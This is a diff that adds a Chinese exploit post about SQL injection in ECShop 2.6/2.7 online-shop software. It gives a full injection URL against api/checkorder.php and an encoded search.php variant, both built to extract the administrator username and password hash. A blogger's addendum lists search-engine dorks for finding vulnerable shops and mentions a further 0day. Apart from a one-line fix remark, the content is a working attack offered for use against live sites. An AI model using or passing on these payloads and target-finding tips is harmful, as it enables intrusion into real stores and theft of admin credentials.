@@ -1,0 +1,26 @@
+
+ecshop 注入通杀2.62.7 GBK版本
+发布日期：2010-10.04
+发布作者：alibaba
+影响版本：通杀2.6*2.7
+官方地址：Ecshop.cn
+漏洞类型：注入漏洞
+漏洞描述：Ecshop网上商城程序2.6/2.7Xapi/checkorder.php页面参数过滤不严导致SQL注入暴管理员用户密码漏洞。
+注入Exp：
+http://localhost/ecshop/api/checkorder.php?username=%ce%27%20and%201=2%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23
+修复方案：对参数进行严格过滤
+漏洞修复：见官方补
+判断程序是GBK还是utf-8方法：查看源代码最上面<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
+ 
+Search.php exp 变种：
+search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319
+ 
+逍遥复仇补充：其实ecshop 真正大站没多少，小站一般用那个search.php页面的oday就可以搞定，实在不行就用lib_common.php的...
+怎么搜ecshop的网站呢？
+inurl:goods.php?
+inurl:myship.php
+inurl:powered by ECSHOP
+其实可以自己统计很简单的。
+本文源于：逍遥复仇's Blog http://www.hackseo.net/，原文地址：http://www.hackseo.net/post/Ecshop注入0day漏洞.html，支持原创，谢绝山寨！
+
+
